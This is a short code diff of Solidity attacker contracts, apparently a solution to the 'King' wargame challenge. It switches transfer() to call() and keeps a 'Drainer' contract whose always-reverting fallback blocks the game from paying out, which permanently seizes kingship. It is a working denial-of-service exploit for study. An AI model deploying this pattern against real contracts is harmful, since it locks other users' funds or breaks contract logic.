@@ -27,18 +27,20 @@ contract King {
 
 contract BecomeKing{
     constructor(address adr) payable{
-        payable(adr).transfer(msg.value);
+        (bool success,) = payable(adr).call{value: msg.value}("");
+
 
     }
 
 }
-
+// 0x26a0E92B0Ff2BDeC46137795901ef54672b1d105
 contract Drainer{
     fallback () external payable{
         require(false);
     }
 constructor(address  adr)payable{
-    payable(adr).transfer(msg.value);
+         (bool success,) = payable(adr).call{value: msg.value}("");
 
 }
+
 }
